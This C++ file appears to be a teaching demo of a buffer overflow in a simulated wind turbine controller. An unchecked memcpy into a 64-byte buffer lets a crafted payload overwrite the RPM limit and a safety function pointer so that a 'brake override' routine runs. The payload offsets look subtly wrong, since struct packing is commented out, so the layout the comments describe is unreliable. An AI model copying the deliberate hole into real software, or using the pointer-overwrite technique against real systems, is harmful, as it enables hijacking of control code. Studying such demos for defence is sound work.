#include <iostream>
#include <cstring>

void defaultShutdown() {
    std::cout << "[INFO] Executing default shutdown procedure.\n";
}

void overrideBrakeSystem() {
    std::cout << "[DANGER] Brake system overridden! Turbine running uncontrolled!\n";
}

// Prevent structure padding to make memory layout predictable
//#pragma pack(push, 1)
class WindTurbineController {
public:
    char configBuffer[64];
    int rpmLimit;
    void (*safetyHandler)();

    WindTurbineController() {
        rpmLimit = 1500;
        safetyHandler = defaultShutdown;
    }

    void applyRemoteConfig(const char* input, size_t len) {
        memcpy(configBuffer, input, len);  // ⚠️ Vulnerable buffer overflow
        if (rpmLimit > 2000) {
            safetyHandler();
        }
    }
};
//#pragma pack(pop)

int main() {
    WindTurbineController turbine;

    std::cout << "[Before] RPM limit: " << turbine.rpmLimit << "\n";
    std::cout << "[Before] SafetyHandler @ " << (void*)turbine.safetyHandler << "\n";

    char payload[76];  // 64 (buffer) + 4 (rpmLimit) + 8 (function pointer on 64-bit)
    memset(payload, 'A', 64);                    // Fill configBuffer
    *(int*)(payload + 64) = 2500;                // Overwrite rpmLimit
    *(void (**)(void))(payload + 68) = overrideBrakeSystem;  // Overwrite safetyHandler

    turbine.applyRemoteConfig(payload, sizeof(payload));

    std::cout << "[After] RPM limit: " << turbine.rpmLimit << "\n";
    std::cout << "[After] SafetyHandler @ " << (void*)turbine.safetyHandler << "\n";

    return 0;
}
